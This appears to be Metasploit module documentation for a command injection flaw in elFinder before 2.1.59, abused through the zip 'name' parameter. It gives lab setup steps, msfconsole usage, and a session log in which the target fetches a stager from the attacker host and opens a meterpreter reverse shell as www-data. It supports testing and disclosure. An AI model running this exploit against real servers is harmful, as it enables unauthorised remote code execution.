## Vulnerable Application

elFinder versions below 2.1.59 are vulnerable to a command injection
vulnerability via its archive functionality.

When creating a new zip archive, the `name` parameter is sanitized
with the `escapeshellarg()` php function and then passed to the
`zip` utility. Despite the sanitization, supplying the `-TmTT`
argument as part of the `name` parameter is still permitted and
enables the execution of arbitrary commands as the `www-data` user.

Tested on elFinder versions `2.1.57`, `2.1.58`, and `2.1.59`.

### Installation Steps

1. Set up a php server
2. Download a vulnerable version of the elFinder [software](https://github.com/Studio-42/elFinder/archive/2.1.58.zip)
3. Rename the minimal connector file: `mv /php/connector.minimal.php-dist /php/connector.minimal.php`
4. Access the software at `http://<host>/elfinder.html`

Additional installation methods can be found [here](https://github.com/Studio-42/elFinder#installation).

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/linux/http/elfinder_archive_cmd_injection`
4. Do: `set RHOST <ip>`
5. Do: `set LHOST <ip>`
6. Do: `run`
7. You should get a meterpreter session.

## Scenarios

### elFinder `v2.1.58` on Ubuntu 20.04.1

```
msf6 > use exploit/linux/http/elfinder_archive_cmd_injection
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set rhost 192.168.140.128
rhost => 192.168.140.128
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set lhost 192.168.140.1
lhost => 192.168.140.1
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > run

[*] Started reverse TCP handler on 192.168.140.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.58
[*] Uploading file LojGHIOkAW.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive fMuuXCkA.zip
[+] Archive was successfully created!
[*] Using URL: http://0.0.0.0:8080/OR3Kz5kxLZp
[*] Local IP: http://192.168.1.199:8080/OR3Kz5kxLZp
[*] Client 192.168.140.128 (Wget/1.20.3 (linux-gnu)) requested /OR3Kz5kxLZp
[*] Sending payload to 192.168.140.128 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  62.50% done (75/120 bytes)
[*] Command Stager progress -  89.17% done (107/120 bytes)
[*] Sending stage (984904 bytes) to 192.168.140.128
[+] Deleted LojGHIOkAW.txt
[+] Deleted fMuuXCkA.zip
[*] Meterpreter session 1 opened (192.168.140.1:4444 -> 192.168.140.128:39822) at 2021-09-09 16:10:06 -0500
[*] Command Stager progress - 100.00% done (120/120 bytes)
[*] Server stopped.

meterpreter > getuid
Server username: www-data @ ubuntu (uid=33, gid=33, euid=33, egid=33)
meterpreter > sysinfo
Computer     : 192.168.140.128
OS           : Ubuntu 20.04 (Linux 5.11.0-27-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```
